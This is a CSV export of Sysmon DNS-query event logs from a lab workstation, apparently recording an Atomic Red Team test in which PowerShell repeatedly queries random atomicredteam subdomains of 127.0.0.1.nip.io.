"2025-12-22 13:58:10.785 +01:00","DNS Query","info","DESKTOP-G2OBL3D","Sysmon",22,"","","sysmon",165532,"Query: atomicredteam-208997.127.0.0.1.nip.io ¦ Result: - ¦ Proc: C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe ¦ PID: 3232 ¦ PGUID: E9F06A57-4052-6949-5305-000000002100","QueryStatus: 9501 ¦ User: DESKTOP-G2OBL3D\student ¦ UtcTime: 2025-12-22 12:58:10.282","Sysmon_22_Info_DNS-Query.yml","d98f628c-2579-4388-bacc-381433b28e5b","C:\Tools\Logs\art_1071_004.evtx"
"2025-12-22 13:58:10.785 +01:00","DNS Query","info","DESKTOP-G2OBL3D","Sysmon",22,"","","sysmon",165533,"Query: atomicredteam-689994.127.0.0.1.nip.io ¦ Result: - ¦ Proc: C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe ¦ PID: 3232 ¦ PGUID: E9F06A57-4052-6949-5305-000000002100","QueryStatus: 9501 ¦ User: DESKTOP-G2OBL3D\student ¦ UtcTime: 2025-12-22 12:58:10.326","Sysmon_22_Info_DNS-Query.yml","d98f628c-2579-4388-bacc-381433b28e5b","C:\Tools\Logs\art_1071_004.evtx"
"2025-12-22 13:58:10.785 +01:00","DNS Query","info","DESKTOP-G2OBL3D","Sysmon",22,"","","sysmon",165534,"Query: atomicredteam-223584.127.0.0.1.nip.io ¦ Result: - ¦ Proc: C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe ¦ PID: 3232 ¦ PGUID: E9F06A57-4052-6949-5305-000000002100","QueryStatus: 9501 ¦ User: DESKTOP-G2OBL3D\student ¦ UtcTime: 2025-12-22 12:58:10.507","Sysmon_22_Info_DNS-Query.yml","d98f628c-2579-4388-bacc-381433b28e5b","C:\Tools\Logs\art_1071_004.evtx"
"2025-12-22 13:58:10.785 +01:00","DNS Query","info","DESKTOP-G2OBL3D","Sysmon",22,"","","sysmon",165535,"Query: atomicredteam-800927.127.0.0.1.nip.io ¦ Result: - ¦ Proc: C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe ¦ PID: 3232 ¦ PGUID: E9F06A57-4052-6949-5305-000000002100","QueryStatus: 9501 ¦ User: DESKTOP-G2OBL3D\student ¦ UtcTime: 2025-12-22 12:58:10.551","Sysmon_22_Info_DNS-Query.yml","d98f628c-2579-4388-bacc-381433b28e5b","C:\Tools\Logs\art_1071_004.evtx"
"2025-12-22 13:58:10.785 +01:00","DNS Query","info","DESKTOP-G2OBL3D","Sysmon",22,"","","sysmon",165536,"Query: atomicredteam-983265.127.0.0.1.nip.io ¦ Result: - ¦ Proc: C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe ¦ PID: 3232 ¦ PGUID: E9F06A57-4052-6949-5305-000000002100","QueryStatus: 9501 ¦ User: DESKTOP-G2OBL3D\student ¦ UtcTime: 2025-12-22 12:58:10.594","Sysmon_22_Info_DNS-Query.yml","d98f628c-2579-4388-bacc-381433b28e5b","C:\Tools\Logs\art_1071_004.evtx"
"2025-12-22 13:58:10.786 +01:00","DNS Query","info","DESKTOP-G2OBL3D","Sysmon",22,"","","sysmon",165537,"Query: atomicredteam-704908.127.0.0.1.nip.io ¦ Result: - ¦ Proc: C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe ¦ PID: 3232 ¦ PGUID: E9F06A57-4052-6949-5305-000000002100","QueryStatus: 9501 ¦ User: DESKTOP-G2OBL3D\student ¦ UtcTime: 2025-12-22 12:58:10.638","Sysmon_22_Info_DNS-Query.yml","d98f628c-2579-4388-bacc-381433b28e5b","C:\Tools\Logs\art_1071_004.evtx"
"2025-12-22 13:58:10.786 +01:00","DNS Query","info","DESKTOP-G2OBL3D","Sysmon",22,"","","sysmon",165538,"Query: atomicredteam-30174.127.0.0.1.nip.io ¦ Result: - ¦ Proc: C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe ¦ PID: 3232 ¦ PGUID: E9F06A57-4052-6949-5305-000000002100","QueryStatus: 9501 ¦ User: DESKTOP-G2OBL3D\student ¦ UtcTime: 2025-12-22 12:58:10.681","Sysmon_22_Info_DNS-Query.yml","d98f628c-2579-4388-bacc-381433b28e5b","C:\Tools\Logs\art_1071_004.evtx"
"2025-12-22 13:58:11.784 +01:00","DNS Query","info","DESKTOP-G2OBL3D","Sysmon",22,"","","sysmon",165539,"Query: atomicredteam-751331.127.0.0.1.nip.io ¦ Result: - ¦ Proc: C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe ¦ PID: 3232 ¦ PGUID: E9F06A57-4052-6949-5305-000000002100","QueryStatus: 9501 ¦ User: DESKTOP-G2OBL3D\student ¦ UtcTime: 2025-12-22 12:58:10.725","Sysmon_22_Info_DNS-Query.yml","d98f628c-2579-4388-bacc-381433b28e5b","C:\Tools\Logs\art_1071_004.evtx"
"2025-12-22 13:58:11.784 +01:00","DNS Query","info","DESKTOP-G2OBL3D","Sysmon",22,"","","sysmon",165540,"Query: atomicredteam-907705.127.0.0.1.nip.io ¦ Result: - ¦ Proc: C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe ¦ PID: 3232 ¦ PGUID: E9F06A57-4052-6949-5305-000000002100","QueryStatus: 9501 ¦ User: DESKTOP-G2OBL3D\student ¦ UtcTime: 2025-12-22 12:58:10.768","Sysmon_22_Info_DNS-Query.yml","d98f628c-2579-4388-bacc-381433b28e5b","C:\Tools\Logs\art_1071_004.evtx"
"2025-12-22 13:58:11.784 +01:00","DNS Query","info","DESKTOP-G2OBL3D","Sysmon",22,"","","sysmon",165541,"Query: atomicredteam-320740.127.0.0.1.nip.io ¦ Result: - ¦ Proc: C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe ¦ PID: 3232 ¦ PGUID: E9F06A57-4052-6949-5305-000000002100","QueryStatus: 9501 ¦ User: DESKTOP-G2OBL3D\student ¦ UtcTime: 2025-12-22 12:58:10.940","Sysmon_22_Info_DNS-Query.yml","d98f628c-2579-4388-bacc-381433b28e5b","C:\Tools\Logs\art_1071_004.evtx"
"2025-12-22 13:58:11.784 +01:00","DNS Query","info","DESKTOP-G2OBL3D","Sysmon",22,"","","sysmon",165542,"Query: atomicredteam-255438.127.0.0.1.nip.io ¦ Result: - ¦ Proc: C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe ¦ PID: 3232 ¦ PGUID: E9F06A57-4052-6949-5305-000000002100","QueryStatus: 9501 ¦ User: DESKTOP-G2OBL3D\student ¦ UtcTime: 2025-12-22 12:58:10.984","Sysmon_22_Info_DNS-Query.yml","d98f628c-2579-4388-bacc-381433b28e5b","C:\Tools\Logs\art_1071_004.evtx"
"2025-12-22 13:58:11.784 +01:00","DNS Query","info","DESKTOP-G2OBL3D","Sysmon",22,"","","sysmon",165543,"Query: atomicredteam-977031.127.0.0.1.nip.io ¦ Result: - ¦ Proc: C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe ¦ PID: 3232 ¦ PGUID: E9F06A57-4052-6949-5305-000000002100","QueryStatus: 9501 ¦ User: DESKTOP-G2OBL3D\student ¦ UtcTime: 2025-12-22 12:58:11.025","Sysmon_22_Info_DNS-Query.yml","d98f628c-2579-4388-bacc-381433b28e5b","C:\Tools\Logs\art_1071_004.evtx"
"2025-12-22 13:58:11.784 +01:00","DNS Query","info","DESKTOP-G2OBL3D","Sysmon",22,"","","sysmon",165544,"Query: atomicredteam-337689.127.0.0.1.nip.io ¦ Result: - ¦ Proc: C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe ¦ PID: 3232 ¦ PGUID: E9F06A57-4052-6949-5305-000000002100","QueryStatus: 9501 ¦ User: DESKTOP-G2OBL3D\student ¦ UtcTime: 2025-12-22 12:58:11.343","Sysmon_22_Info_DNS-Query.yml","d98f628c-2579-4388-bacc-381433b28e5b","C:\Tools\Logs\art_1071_004.evtx"
"2025-12-22 13:58:11.784 +01:00","DNS Query","info","DESKTOP-G2OBL3D","Sysmon",22,"","","sysmon",165545,"Query: atomicredteam-111891.127.0.0.1.nip.io ¦ Result: - ¦ Proc: C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe ¦ PID: 3232 ¦ PGUID: E9F06A57-4052-6949-5305-000000002100","QueryStatus: 9501 ¦ User: DESKTOP-G2OBL3D\student ¦ UtcTime: 2025-12-22 12:58:11.391","Sysmon_22_Info_DNS-Query.yml","d98f628c-2579-4388-bacc-381433b28e5b","C:\Tools\Logs\art_1071_004.evtx"
"2025-12-22 13:58:11.785 +01:00","DNS Query","info","DESKTOP-G2OBL3D","Sysmon",22,"","","sysmon",165546,"Query: atomicredteam-213900.127.0.0.1.nip.io ¦ Result: - ¦ Proc: C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe ¦ PID: 3232 ¦ PGUID: E9F06A57-4052-6949-5305-000000002100","QueryStatus: 9501 ¦ User: DESKTOP-G2OBL3D\student ¦ UtcTime: 2025-12-22 12:58:11.709","Sysmon_22_Info_DNS-Query.yml","d98f628c-2579-4388-bacc-381433b28e5b","C:\Tools\Logs\art_1071_004.evtx"
"2025-12-22 13:58:11.785 +01:00","DNS Query","info","DESKTOP-G2OBL3D","Sysmon",22,"","","sysmon",165547,"Query: atomicredteam-560561.127.0.0.1.nip.io ¦ Result: - ¦ Proc: C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe ¦ PID: 3232 ¦ PGUID: E9F06A57-4052-6949-5305-000000002100","QueryStatus: 9501 ¦ User: DESKTOP-G2OBL3D\student ¦ UtcTime: 2025-12-22 12:58:11.753","Sysmon_22_Info_DNS-Query.yml","d98f628c-2579-4388-bacc-381433b28e5b","C:\Tools\Logs\art_1071_004.evtx"
"2025-12-22 13:58:12.785 +01:00","DNS Query","info","DESKTOP-G2OBL3D","Sysmon",22,"","","sysmon",165548,"Query: atomicredteam-764373.127.0.0.1.nip.io ¦ Result: - ¦ Proc: C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe ¦ PID: 3232 ¦ PGUID: E9F06A57-4052-6949-5305-000000002100","QueryStatus: 9501 ¦ User: DESKTOP-G2OBL3D\student ¦ UtcTime: 2025-12-22 12:58:11.798","Sysmon_22_Info_DNS-Query.yml","d98f628c-2579-4388-bacc-381433b28e5b","C:\Tools\Logs\art_1071_004.evtx"
"2025-12-22 13:58:12.785 +01:00","DNS Query","info","DESKTOP-G2OBL3D","Sysmon",22,"","","sysmon",165549,"Query: atomicredteam-14885.127.0.0.1.nip.io ¦ Result: - ¦ Proc: C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe ¦ PID: 3232 ¦ PGUID: E9F06A57-4052-6949-5305-000000002100","QueryStatus: 9501 ¦ User: DESKTOP-G2OBL3D\student ¦ UtcTime: 2025-12-22 12:58:11.841","Sysmon_22_Info_DNS-Query.yml","d98f628c-2579-4388-bacc-381433b28e5b","C:\Tools\Logs\art_1071_004.evtx"
"2025-12-22 13:58:12.785 +01:00","DNS Query","info","DESKTOP-G2OBL3D","Sysmon",22,"","","sysmon",165550,"Query: atomicredteam-658569.127.0.0.1.nip.io ¦ Result: - ¦ Proc: C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe ¦ PID: 3232 ¦ PGUID: E9F06A57-4052-6949-5305-000000002100","QueryStatus: 9501 ¦ User: DESKTOP-G2OBL3D\student ¦ UtcTime: 2025-12-22 12:58:11.885","Sysmon_22_Info_DNS-Query.yml","d98f628c-2579-4388-bacc-381433b28e5b","C:\Tools\Logs\art_1071_004.evtx"
"2025-12-22 13:58:12.786 +01:00","DNS Query","info","DESKTOP-G2OBL3D","Sysmon",22,"","","sysmon",165551,"Query: atomicredteam-594792.127.0.0.1.nip.io ¦ Result: - ¦ Proc: C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe ¦ PID: 3232 ¦ PGUID: E9F06A57-4052-6949-5305-000000002100","QueryStatus: 9501 ¦ User: DESKTOP-G2OBL3D\student ¦ UtcTime: 2025-12-22 12:58:11.929","Sysmon_22_Info_DNS-Query.yml","d98f628c-2579-4388-bacc-381433b28e5b","C:\Tools\Logs\art_1071_004.evtx"
"2025-12-22 13:58:12.786 +01:00","DNS Query","info","DESKTOP-G2OBL3D","Sysmon",22,"","","sysmon",165552,"Query: atomicredteam-435628.127.0.0.1.nip.io ¦ Result: - ¦ Proc: C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe ¦ PID: 3232 ¦ PGUID: E9F06A57-4052-6949-5305-000000002100","QueryStatus: 9501 ¦ User: DESKTOP-G2OBL3D\student ¦ UtcTime: 2025-12-22 12:58:11.969","Sysmon_22_Info_DNS-Query.yml","d98f628c-2579-4388-bacc-381433b28e5b","C:\Tools\Logs\art_1071_004.evtx"
"2025-12-22 13:58:12.786 +01:00","DNS Query","info","DESKTOP-G2OBL3D","Sysmon",22,"","","sysmon",165553,"Query: atomicredteam-20566.127.0.0.1.nip.io ¦ Result: - ¦ Proc: C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe ¦ PID: 3232 ¦ PGUID: E9F06A57-4052-6949-5305-000000002100","QueryStatus: 9501 ¦ User: DESKTOP-G2OBL3D\student ¦ UtcTime: 2025-12-22 12:58:12.010","Sysmon_22_Info_DNS-Query.yml","d98f628c-2579-4388-bacc-381433b28e5b","C:\Tools\Logs\art_1071_004.evtx"
"2025-12-22 13:58:12.786 +01:00","DNS Query","info","DESKTOP-G2OBL3D","Sysmon",22,"","","sysmon",165554,"Query: atomicredteam-606489.127.0.0.1.nip.io ¦ Result: - ¦ Proc: C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe ¦ PID: 3232 ¦ PGUID: E9F06A57-4052-6949-5305-000000002100","QueryStatus: 9501 ¦ User: DESKTOP-G2OBL3D\student ¦ UtcTime: 2025-12-22 12:58:12.053","Sysmon_22_Info_DNS-Query.yml","d98f628c-2579-4388-bacc-381433b28e5b","C:\Tools\Logs\art_1071_004.evtx"
"2025-12-22 13:58:12.786 +01:00","DNS Query","info","DESKTOP-G2OBL3D","Sysmon",22,"","","sysmon",165555,"Query: atomicredteam-91375.127.0.0.1.nip.io ¦ Result: - ¦ Proc: C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe ¦ PID: 3232 ¦ PGUID: E9F06A57-4052-6949-5305-000000002100","QueryStatus: 9501 ¦ User: DESKTOP-G2OBL3D\student ¦ UtcTime: 2025-12-22 12:58:12.098","Sysmon_22_Info_DNS-Query.yml","d98f628c-2579-4388-bacc-381433b28e5b","C:\Tools\Logs\art_1071_004.evtx"
"2025-12-22 13:58:12.786 +01:00","DNS Query","info","DESKTOP-G2OBL3D","Sysmon",22,"","","sysmon",165556,"Query: atomicredteam-493082.127.0.0.1.nip.io ¦ Result: - ¦ Proc: C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe ¦ PID: 3232 ¦ PGUID: E9F06A57-4052-6949-5305-000000002100","QueryStatus: 9501 ¦ User: DESKTOP-G2OBL3D\student ¦ UtcTime: 2025-12-22 12:58:12.141","Sysmon_22_Info_DNS-Query.yml","d98f628c-2579-4388-bacc-381433b28e5b","C:\Tools\Logs\art_1071_004.evtx"
"2025-12-22 13:58:12.786 +01:00","DNS Query","info","DESKTOP-G2OBL3D","Sysmon",22,"","","sysmon",165557,"Query: atomicredteam-462509.127.0.0.1.nip.io ¦ Result: - ¦ Proc: C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe ¦ PID: 3232 ¦ PGUID: E9F06A57-4052-6949-5305-000000002100","QueryStatus: 9501 ¦ User: DESKTOP-G2OBL3D\student ¦ UtcTime: 2025-12-22 12:58:12.184","Sysmon_22_Info_DNS-Query.yml","d98f628c-2579-4388-bacc-381433b28e5b","C:\Tools\Logs\art_1071_004.evtx"
"2025-12-22 13:58:12.786 +01:00","DNS Query","info","DESKTOP-G2OBL3D","Sysmon",22,"","","sysmon",165558,"Query: atomicredteam-545331.127.0.0.1.nip.io ¦ Result: - ¦ Proc: C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe ¦ PID: 3232 ¦ PGUID: E9F06A57-4052-6949-5305-000000002100","QueryStatus: 9501 ¦ User: DESKTOP-G2OBL3D\student ¦ UtcTime: 2025-12-22 12:58:12.355","Sysmon_22_Info_DNS-Query.yml","d98f628c-2579-4388-bacc-381433b28e5b","C:\Tools\Logs\art_1071_004.evtx"
"2025-12-22 13:58:12.786 +01:00","DNS Query","info","DESKTOP-G2OBL3D","Sysmon",22,"","","sysmon",165559,"Query: atomicredteam-769891.127.0.0.1.nip.io ¦ Result: - ¦ Proc: C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe ¦ PID: 3232 ¦ PGUID: E9F06A57-4052-6949-5305-000000002100","QueryStatus: 9501 ¦ User: DESKTOP-G2OBL3D\student ¦ UtcTime: 2025-12-22 12:58:12.399","Sysmon_22_Info_DNS-Query.yml","d98f628c-2579-4388-bacc-381433b28e5b","C:\Tools\Logs\art_1071_004.evtx"
"2025-12-22 13:58:12.787 +01:00","DNS Query","info","DESKTOP-G2OBL3D","Sysmon",22,"","","sysmon",165560,"Query: atomicredteam-385666.127.0.0.1.nip.io ¦ Result: - ¦ Proc: C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe ¦ PID: 3232 ¦ PGUID: E9F06A57-4052-6949-5305-000000002100","QueryStatus: 9501 ¦ User: DESKTOP-G2OBL3D\student ¦ UtcTime: 2025-12-22 12:58:12.445","Sysmon_22_Info_DNS-Query.yml","d98f628c-2579-4388-bacc-381433b28e5b","C:\Tools\Logs\art_1071_004.evtx"
"2025-12-22 13:58:12.787 +01:00","DNS Query","info","DESKTOP-G2OBL3D","Sysmon",22,"","","sysmon",165561,"Query: atomicredteam-700479.127.0.0.1.nip.io ¦ Result: - ¦ Proc: C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe ¦ PID: 3232 ¦ PGUID: E9F06A57-4052-6949-5305-000000002100","QueryStatus: 9501 ¦ User: DESKTOP-G2OBL3D\student ¦ UtcTime: 2025-12-22 12:58:12.488","Sysmon_22_Info_DNS-Query.yml","d98f628c-2579-4388-bacc-381433b28e5b","C:\Tools\Logs\art_1071_004.evtx"
"2025-12-22 13:58:12.787 +01:00","DNS Query","info","DESKTOP-G2OBL3D","Sysmon",22,"","","sysmon",165562,"Query: atomicredteam-622206.127.0.0.1.nip.io ¦ Result: - ¦ Proc: C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe ¦ PID: 3232 ¦ PGUID: E9F06A57-4052-6949-5305-000000002100","QueryStatus: 9501 ¦ User: DESKTOP-G2OBL3D\student ¦ UtcTime: 2025-12-22 12:58:12.533","Sysmon_22_Info_DNS-Query.yml","d98f628c-2579-4388-bacc-381433b28e5b","C:\Tools\Logs\art_1071_004.evtx"
"2025-12-22 13:58:12.787 +01:00","DNS Query","info","DESKTOP-G2OBL3D","Sysmon",22,"","","sysmon",165563,"Query: atomicredteam-44262.127.0.0.1.nip.io ¦ Result: - ¦ Proc: C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe ¦ PID: 3232 ¦ PGUID: E9F06A57-4052-6949-5305-000000002100","QueryStatus: 9501 ¦ User: DESKTOP-G2OBL3D\student ¦ UtcTime: 2025-12-22 12:58:12.578","Sysmon_22_Info_DNS-Query.yml","d98f628c-2579-4388-bacc-381433b28e5b","C:\Tools\Logs\art_1071_004.evtx"
"2025-12-22 13:58:12.787 +01:00","DNS Query","info","DESKTOP-G2OBL3D","Sysmon",22,"","","sysmon",165564,"Query: atomicredteam-367339.127.0.0.1.nip.io ¦ Result: - ¦ Proc: C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe ¦ PID: 3232 ¦ PGUID: E9F06A57-4052-6949-5305-000000002100","QueryStatus: 9501 ¦ User: DESKTOP-G2OBL3D\student ¦ UtcTime: 2025-12-22 12:58:12.621","Sysmon_22_Info_DNS-Query.yml","d98f628c-2579-4388-bacc-381433b28e5b","C:\Tools\Logs\art_1071_004.evtx"
"2025-12-22 13:58:12.787 +01:00","DNS Query","info","DESKTOP-G2OBL3D","Sysmon",22,"","","sysmon",165565,"Query: atomicredteam-876842.127.0.0.1.nip.io ¦ Result: - ¦ Proc: C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe ¦ PID: 3232 ¦ PGUID: E9F06A57-4052-6949-5305-000000002100","QueryStatus: 9501 ¦ User: DESKTOP-G2OBL3D\student ¦ UtcTime: 2025-12-22 12:58:12.664","Sysmon_22_Info_DNS-Query.yml","d98f628c-2579-4388-bacc-381433b28e5b","C:\Tools\Logs\art_1071_004.evtx"
"2025-12-22 13:58:12.787 +01:00","DNS Query","info","DESKTOP-G2OBL3D","Sysmon",22,"","","sysmon",165566,"Query: atomicredteam-754818.127.0.0.1.nip.io ¦ Result: - ¦ Proc: C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe ¦ PID: 3232 ¦ PGUID: E9F06A57-4052-6949-5305-000000002100","QueryStatus: 9501 ¦ User: DESKTOP-G2OBL3D\student ¦ UtcTime: 2025-12-22 12:58:12.707","Sysmon_22_Info_DNS-Query.yml","d98f628c-2579-4388-bacc-381433b28e5b","C:\Tools\Logs\art_1071_004.evtx"
"2025-12-22 13:58:12.787 +01:00","DNS Query","info","DESKTOP-G2OBL3D","Sysmon",22,"","","sysmon",165567,"Query: atomicredteam-492156.127.0.0.1.nip.io ¦ Result: - ¦ Proc: C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe ¦ PID: 3232 ¦ PGUID: E9F06A57-4052-6949-5305-000000002100","QueryStatus: 9501 ¦ User: DESKTOP-G2OBL3D\student ¦ UtcTime: 2025-12-22 12:58:12.752","Sysmon_22_Info_DNS-Query.yml","d98f628c-2579-4388-bacc-381433b28e5b","C:\Tools\Logs\art_1071_004.evtx"
"2025-12-22 13:58:13.790 +01:00","DNS Query","info","DESKTOP-G2OBL3D","Sysmon",22,"","","sysmon",165568,"Query: atomicredteam-673076.127.0.0.1.nip.io ¦ Result: - ¦ Proc: C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe ¦ PID: 3232 ¦ PGUID: E9F06A57-4052-6949-5305-000000002100","QueryStatus: 9501 ¦ User: DESKTOP-G2OBL3D\student ¦ UtcTime: 2025-12-22 12:58:12.796","Sysmon_22_Info_DNS-Query.yml","d98f628c-2579-4388-bacc-381433b28e5b","C:\Tools\Logs\art_1071_004.evtx"
"2025-12-22 13:58:13.790 +01:00","DNS Query","info","DESKTOP-G2OBL3D","Sysmon",22,"","","sysmon",165569,"Query: atomicredteam-128618.127.0.0.1.nip.io ¦ Result: - ¦ Proc: C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe ¦ PID: 3232 ¦ PGUID: E9F06A57-4052-6949-5305-000000002100","QueryStatus: 9501 ¦ User: DESKTOP-G2OBL3D\student ¦ UtcTime: 2025-12-22 12:58:12.839","Sysmon_22_Info_DNS-Query.yml","d98f628c-2579-4388-bacc-381433b28e5b","C:\Tools\Logs\art_1071_004.evtx"
"2025-12-22 13:58:13.790 +01:00","DNS Query","info","DESKTOP-G2OBL3D","Sysmon",22,"","","sysmon",165570,"Query: atomicredteam-7873.127.0.0.1.nip.io ¦ Result: - ¦ Proc: C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe ¦ PID: 3232 ¦ PGUID: E9F06A57-4052-6949-5305-000000002100","QueryStatus: 9501 ¦ User: DESKTOP-G2OBL3D\student ¦ UtcTime: 2025-12-22 12:58:12.880","Sysmon_22_Info_DNS-Query.yml","d98f628c-2579-4388-bacc-381433b28e5b","C:\Tools\Logs\art_1071_004.evtx"
"2025-12-22 13:58:13.790 +01:00","DNS Query","info","DESKTOP-G2OBL3D","Sysmon",22,"","","sysmon",165571,"Query: atomicredteam-241407.127.0.0.1.nip.io ¦ Result: - ¦ Proc: C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe ¦ PID: 3232 ¦ PGUID: E9F06A57-4052-6949-5305-000000002100","QueryStatus: 9501 ¦ User: DESKTOP-G2OBL3D\student ¦ UtcTime: 2025-12-22 12:58:12.923","Sysmon_22_Info_DNS-Query.yml","d98f628c-2579-4388-bacc-381433b28e5b","C:\Tools\Logs\art_1071_004.evtx"
"2025-12-22 13:58:13.790 +01:00","DNS Query","info","DESKTOP-G2OBL3D","Sysmon",22,"","","sysmon",165572,"Query: atomicredteam-797157.127.0.0.1.nip.io ¦ Result: - ¦ Proc: C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe ¦ PID: 3232 ¦ PGUID: E9F06A57-4052-6949-5305-000000002100","QueryStatus: 9501 ¦ User: DESKTOP-G2OBL3D\student ¦ UtcTime: 2025-12-22 12:58:12.966","Sysmon_22_Info_DNS-Query.yml","d98f628c-2579-4388-bacc-381433b28e5b","C:\Tools\Logs\art_1071_004.evtx"
"2025-12-22 13:58:13.791 +01:00","DNS Query","info","DESKTOP-G2OBL3D","Sysmon",22,"","","sysmon",165573,"Query: atomicredteam-18109.127.0.0.1.nip.io ¦ Result: - ¦ Proc: C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe ¦ PID: 3232 ¦ PGUID: E9F06A57-4052-6949-5305-000000002100","QueryStatus: 9501 ¦ User: DESKTOP-G2OBL3D\student ¦ UtcTime: 2025-12-22 12:58:13.009","Sysmon_22_Info_DNS-Query.yml","d98f628c-2579-4388-bacc-381433b28e5b","C:\Tools\Logs\art_1071_004.evtx"
"2025-12-22 13:58:13.791 +01:00","DNS Query","info","DESKTOP-G2OBL3D","Sysmon",22,"","","sysmon",165574,"Query: atomicredteam-328125.127.0.0.1.nip.io ¦ Result: - ¦ Proc: C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe ¦ PID: 3232 ¦ PGUID: E9F06A57-4052-6949-5305-000000002100","QueryStatus: 9501 ¦ User: DESKTOP-G2OBL3D\student ¦ UtcTime: 2025-12-22 12:58:13.053","Sysmon_22_Info_DNS-Query.yml","d98f628c-2579-4388-bacc-381433b28e5b","C:\Tools\Logs\art_1071_004.evtx"
"2025-12-22 13:58:13.791 +01:00","DNS Query","info","DESKTOP-G2OBL3D","Sysmon",22,"","","sysmon",165575,"Query: atomicredteam-325896.127.0.0.1.nip.io ¦ Result: - ¦ Proc: C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe ¦ PID: 3232 ¦ PGUID: E9F06A57-4052-6949-5305-000000002100","QueryStatus: 9501 ¦ User: DESKTOP-G2OBL3D\student ¦ UtcTime: 2025-12-22 12:58:13.097","Sysmon_22_Info_DNS-Query.yml","d98f628c-2579-4388-bacc-381433b28e5b","C:\Tools\Logs\art_1071_004.evtx"
"2025-12-22 13:58:13.791 +01:00","DNS Query","info","DESKTOP-G2OBL3D","Sysmon",22,"","","sysmon",165576,"Query: atomicredteam-579023.127.0.0.1.nip.io ¦ Result: - ¦ Proc: C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe ¦ PID: 3232 ¦ PGUID: E9F06A57-4052-6949-5305-000000002100","QueryStatus: 9501 ¦ User: DESKTOP-G2OBL3D\student ¦ UtcTime: 2025-12-22 12:58:13.140","Sysmon_22_Info_DNS-Query.yml","d98f628c-2579-4388-bacc-381433b28e5b","C:\Tools\Logs\art_1071_004.evtx"
"2025-12-22 13:58:13.791 +01:00","DNS Query","info","DESKTOP-G2OBL3D","Sysmon",22,"","","sysmon",165577,"Query: atomicredteam-193822.127.0.0.1.nip.io ¦ Result: - ¦ Proc: C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe ¦ PID: 3232 ¦ PGUID: E9F06A57-4052-6949-5305-000000002100","QueryStatus: 9501 ¦ User: DESKTOP-G2OBL3D\student ¦ UtcTime: 2025-12-22 12:58:13.314","Sysmon_22_Info_DNS-Query.yml","d98f628c-2579-4388-bacc-381433b28e5b","C:\Tools\Logs\art_1071_004.evtx"
"2025-12-22 13:58:13.791 +01:00","DNS Query","info","DESKTOP-G2OBL3D","Sysmon",22,"","","sysmon",165578,"Query: atomicredteam-756635.127.0.0.1.nip.io ¦ Result: - ¦ Proc: C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe ¦ PID: 3232 ¦ PGUID: E9F06A57-4052-6949-5305-000000002100","QueryStatus: 9501 ¦ User: DESKTOP-G2OBL3D\student ¦ UtcTime: 2025-12-22 12:58:13.356","Sysmon_22_Info_DNS-Query.yml","d98f628c-2579-4388-bacc-381433b28e5b","C:\Tools\Logs\art_1071_004.evtx"
"2025-12-22 13:58:13.791 +01:00","DNS Query","info","DESKTOP-G2OBL3D","Sysmon",22,"","","sysmon",165579,"Query: atomicredteam-459788.127.0.0.1.nip.io ¦ Result: - ¦ Proc: C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe ¦ PID: 3232 ¦ PGUID: E9F06A57-4052-6949-5305-000000002100","QueryStatus: 9501 ¦ User: DESKTOP-G2OBL3D\student ¦ UtcTime: 2025-12-22 12:58:13.398","Sysmon_22_Info_DNS-Query.yml","d98f628c-2579-4388-bacc-381433b28e5b","C:\Tools\Logs\art_1071_004.evtx"
"2025-12-22 13:58:13.791 +01:00","DNS Query","info","DESKTOP-G2OBL3D","Sysmon",22,"","","sysmon",165580,"Query: atomicredteam-494128.127.0.0.1.nip.io ¦ Result: - ¦ Proc: C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe ¦ PID: 3232 ¦ PGUID: E9F06A57-4052-6949-5305-000000002100","QueryStatus: 9501 ¦ User: DESKTOP-G2OBL3D\student ¦ UtcTime: 2025-12-22 12:58:13.568","Sysmon_22_Info_DNS-Query.yml","d98f628c-2579-4388-bacc-381433b28e5b","C:\Tools\Logs\art_1071_004.evtx"
